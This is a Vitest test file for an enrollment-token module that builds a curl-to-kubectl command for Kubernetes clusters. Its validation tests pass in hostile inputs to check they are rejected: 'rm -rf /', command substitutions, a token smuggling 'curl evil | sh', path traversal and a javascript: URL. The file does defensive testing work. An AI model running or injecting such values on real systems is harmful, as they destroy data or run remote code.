import { describe, expect, it, vi } from 'vitest'
import { STATUS, TTL_CHOICES, clock, clusterProblem, createEnrollment, enrollCommand, hubUrl, listEnrollments, revokeEnrollment, secondsLeft, validCluster, validId, valuesSnippet } from './enrollments'

const TOKEN = 'enr_' + 'A'.repeat(43)

describe('cluster names', () => {
  it('are lower-case letters, digits and . _ -, as the service holds them to', () => {
    for (const ok of ['gke', 'prod-eu.1', 'a', 'a1', 'x_y']) expect(validCluster(ok), ok).toBe(true)
    for (const bad of ['', 'GKE', 'my cluster', '-a', 'a-', '.a', 'a'.repeat(65), 'a/b', "a'b", 'a;b', undefined, null]) expect(validCluster(bad), String(bad)).toBe(false)
    expect(clusterProblem('')).toContain('Give the cluster a name')
    expect(clusterProblem('GKE')).toContain('Lower-case')
    expect(clusterProblem('gke')).toBe('')
  })
  it('ids are twelve hex characters', () => {
    expect(validId('0123456789ab')).toBe(true)
    for (const bad of ['', '0123456789a', '0123456789abc', '0123456789AB', '../etc/passwd', undefined]) expect(validId(bad), String(bad)).toBe(false)
  })
})

describe('hubUrl', () => {
  it('takes an http or https address and drops a trailing slash', () => {
    expect(hubUrl('http://hub:30081')).toEqual({ url: 'http://hub:30081' })
    expect(hubUrl('  https://hub.example.com/  ')).toEqual({ url: 'https://hub.example.com' })
    expect(hubUrl('http://10.0.0.5:30081///')).toEqual({ url: 'http://10.0.0.5:30081' })
    expect(hubUrl('https://hub.example.com/ingest')).toEqual({ url: 'https://hub.example.com/ingest' })
  })
  it('refuses what is not an address or has more than an address', () => {
    for (const bad of ['', '   ', 'hub:30081', 'ftp://hub', 'javascript:alert(1)', 'http://u:p@hub', 'http://hub?x=1', 'http://hub#f', 'not a url', "http://hub/'; rm -rf /", 'http://hub/`id`', 'http://hub/$(id)', 'http://hub/a b', 'http://hub/a"b', 'http://hub/a\\b', 'http://hub/a;b', 'http://hub/a|b']) {
      expect(hubUrl(bad).error, bad).toBeTruthy()
    }
    expect(hubUrl(undefined).error).toBeTruthy()
  })
})

describe('enrollCommand', () => {
  it('asks the hub for the Secret and gives it to kubectl, and prints no key', () => {
    const c = enrollCommand({ url: 'http://hub:30081/', token: TOKEN })
    expect(c).toBe(`curl -fsS -X POST 'http://hub:30081/v1/enroll?format=secret' -H 'Content-Type: application/json' -d '{"token":"${TOKEN}"}' | kubectl apply -f -`)
    expect(c).not.toContain('ing_')
  })
  it('names the namespace only when it is not the default', () => {
    expect(enrollCommand({ url: 'http://hub', token: TOKEN, namespace: 'monitoring' })).toContain(`'{"token":"${TOKEN}","namespace":"monitoring"}'`)
    expect(enrollCommand({ url: 'http://hub', token: TOKEN, namespace: 'telemetry-agent' })).not.toContain('namespace')
  })
  // what goes on the line was checked first: a service that was not what it seemed cannot add to the command
  it('is null when anything that goes into it is not what it must be', () => {
    const bad = [
      { url: 'http://hub', token: "enr_" + "A".repeat(42) + "'; curl evil | sh; '" },
      { url: 'http://hub', token: TOKEN + 'x' },
      { url: 'http://hub', token: 'enr_' + 'A'.repeat(42) },
      { url: 'http://hub', token: 'ing_' + 'A'.repeat(43) },
      { url: 'http://hub', token: '' },
      { url: 'http://hub', token: undefined },
      { url: "http://hub/'; evil", token: TOKEN },
      { url: 'ftp://hub', token: TOKEN },
      { url: 'http://hub', token: TOKEN, namespace: 'a"; evil' },
      { url: 'http://hub', token: TOKEN, namespace: 'Prod' },
      { url: 'http://hub', token: TOKEN, namespace: '' },
    ]
    for (const b of bad) expect(enrollCommand(b), JSON.stringify(b)).toBeNull()
  })
})

describe('valuesSnippet', () => {
  it('shows the values that use the Secret, with the cluster and the address filled in', () => {
    const s = valuesSnippet({ cluster: 'gke', url: 'http://hub:30081/' })
    expect(s).toContain('collectorURL: http://hub:30081')
    expect(s).toContain('clusterName: gke')
    expect(s).toContain('nodeAgent:')
    expect(s).toContain('clusterCollector:')
  })
  it('is null when either is not usable', () => {
    expect(valuesSnippet({ cluster: 'Bad Name', url: 'http://hub' })).toBeNull()
    expect(valuesSnippet({ cluster: 'gke', url: 'nope' })).toBeNull()
  })
})

describe('time and status', () => {
  it('counts the seconds left, never below zero', () => {
    const t = Date.parse('2026-11-10T12:00:00Z')
    expect(secondsLeft('2026-11-10T12:15:00Z', t)).toBe(900)
    expect(secondsLeft('2026-11-10T11:00:00Z', t)).toBe(0)
    expect(secondsLeft('garbage', t)).toBe(0)
    expect(secondsLeft(undefined, t)).toBe(0)
  })
  it('shows them as minutes and seconds', () => {
    expect([clock(900), clock(65), clock(5), clock(0), clock(-3), clock(3599)]).toEqual(['15:00', '1:05', '0:05', '0:00', '0:00', '59:59'])
  })
  it('has a label and a tone for every state the service has', () => {
    for (const s of ['pending', 'redeemed', 'expired', 'revoked']) expect(STATUS[s].label && STATUS[s].tone).toBeTruthy()
    expect(TTL_CHOICES[0].minutes).toBe(15)
    expect(TTL_CHOICES.every((c) => c.minutes >= 1 && c.minutes <= 1440)).toBe(true)
  })
})

describe('the calls', () => {
  it('lists, makes and revokes through the client, with the manage key for the writes', async () => {
    const client = { get: vi.fn(async () => [{ id: 'a' }]), send: vi.fn(async () => ({ id: 'a', token: TOKEN })) }
    expect(await listEnrollments(client)).toEqual([{ id: 'a' }])
    expect(client.get).toHaveBeenCalledWith('enrollments')
    await createEnrollment(client, { cluster: 'gke', ttlMinutes: 60, manageKey: 'mk', actor: 'ana' })
    expect(client.send).toHaveBeenLastCalledWith('POST', 'enrollments', { key: 'mk', body: { cluster: 'gke', ttl_minutes: 60 }, actor: 'ana' })
    await createEnrollment(client, { cluster: 'gke', manageKey: 'mk' })
    expect(client.send).toHaveBeenLastCalledWith('POST', 'enrollments', { key: 'mk', body: { cluster: 'gke' }, actor: undefined })
    await revokeEnrollment(client, '0123456789ab', { manageKey: 'mk', actor: 'ana' })
    expect(client.send).toHaveBeenLastCalledWith('DELETE', 'enrollments/0123456789ab', { key: 'mk', actor: 'ana' })
  })
  it('does not put an id that is not one into a path', async () => {
    const client = { send: vi.fn() }
    await expect(revokeEnrollment(client, '../incidents/x', { manageKey: 'mk' })).rejects.toThrow('not an enrollment')
    expect(client.send).not.toHaveBeenCalled()
  })
  it('takes a service that answers with nothing as no enrollments', async () => {
    expect(await listEnrollments({ get: async () => null })).toEqual([])
    expect(await listEnrollments({ get: async () => ({}) })).toEqual([])
  })
})
